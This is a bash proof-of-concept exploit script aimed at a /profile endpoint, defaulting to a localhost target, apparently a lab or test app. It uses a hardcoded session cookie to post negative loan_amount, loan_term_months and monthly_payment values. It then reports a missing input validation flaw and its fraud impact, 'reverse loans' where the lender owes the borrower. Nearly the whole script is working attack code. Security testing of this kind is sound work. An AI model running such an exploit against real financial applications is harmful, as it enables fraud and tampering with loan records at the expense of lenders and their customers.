#!/bin/bash

# POC: Negative Value Injection in Loan Parameters (v2)
# Target: /profile endpoint
# Description: Demonstrates acceptance of negative loan parameter values without validation

set -e

TARGET_URL="${1:-http://localhost:32768}"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4l1Q.HCUPd0DtxvLhBOb42cVB4EE0uKQ"

echo "[*] Testing Negative Value Injection in Loan Parameters"
echo "[*] Target: ${TARGET_URL}/profile"
echo ""

# Step 1: Submit negative values via POST and capture full response
echo "[+] Step 1: Submitting negative loan parameters to /profile"
echo "    - loan_amount: -5000"
echo "    - loan_term_months: -12"
echo "    - monthly_payment: -100"
echo ""

# Make POST request with negative values
POST_RESPONSE=$(curl -s -b "${SESSION_COOKIE}" -X POST "${TARGET_URL}/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=-5000&loan_term_months=-12&monthly_payment=-100" \
  -w "\nHTTP_CODE:%{http_code}" -i)

HTTP_CODE=$(echo "$POST_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
HEADERS=$(echo "$POST_RESPONSE" | head -n -1)

echo "[*] POST Response Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "200" ]]; then
    echo "[+] Request accepted (HTTP $HTTP_CODE)"
    echo "[+] Negative values were not rejected by input validation"
    VALIDATION_PASSED=1
else
    echo "[-] Request rejected (HTTP $HTTP_CODE)"
    VALIDATION_PASSED=0
fi
echo ""

# Step 2: Check the response headers for redirect
echo "[+] Step 2: Analyzing response"
echo "$HEADERS" | head -n 5
echo ""

# Step 3: Report findings
echo "[+] Step 3: Vulnerability Assessment"
echo ""

if [[ $VALIDATION_PASSED -eq 1 ]]; then
    echo "[✓] VULNERABILITY CONFIRMED: Negative values accepted without validation"
    echo "[✓] POST endpoint does not validate loan parameters for positive values"
    echo "[✓] Server accepted negative loan_amount (-5000)"
    echo "[✓] Server accepted negative loan_term_months (-12)"
    echo "[✓] Server accepted negative monthly_payment (-100)"
    echo ""
    echo "[!] Business Logic Impact:"
    echo "    - Negative principal inverts liability (credit instead of debt)"
    echo "    - Negative payment terms are mathematically nonsensical"
    echo "    - System accepts semantically invalid financial data"
    echo "    - Could enable fraudulent 'reverse loans' where lender owes borrower"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi